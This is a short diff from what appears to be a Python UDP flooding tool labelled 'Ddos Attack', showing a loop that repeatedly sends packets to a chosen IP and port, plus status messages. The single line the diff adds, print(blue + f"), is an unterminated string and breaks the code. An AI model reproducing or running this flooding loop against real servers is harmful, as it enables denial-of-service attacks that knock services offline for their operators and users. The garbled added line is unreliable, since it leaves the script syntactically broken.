@@ -53,6 +53,7 @@ def run():
       addr = (str(ip),int(port))
       for x in range(times):
         s.sendto(data,addr)
+      print(blue + f")
       print(i + "|###[Ddos Attack] GO [Server]###|")
     except:
       print("[!] |###[Ddos Attack] GO [Server]###|")
